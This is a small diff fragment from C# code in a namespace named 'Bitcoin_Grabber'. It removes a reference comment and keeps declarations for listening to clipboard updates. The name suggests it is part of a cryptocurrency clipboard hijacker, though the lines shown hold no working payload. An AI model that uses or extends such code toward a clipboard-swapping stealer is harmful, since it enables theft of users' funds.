@@ -43,7 +43,6 @@ namespace Bitcoin_Grabber
 
     internal static class NativeMethods
     {
-        //stackoverflow.com/questions/17762037/error-while-trying-to-copy-string-to-clipboard
         public const int WM_CLIPBOARDUPDATE = 0x031D;
         public static IntPtr HWND_MESSAGE = new IntPtr(-3);
 
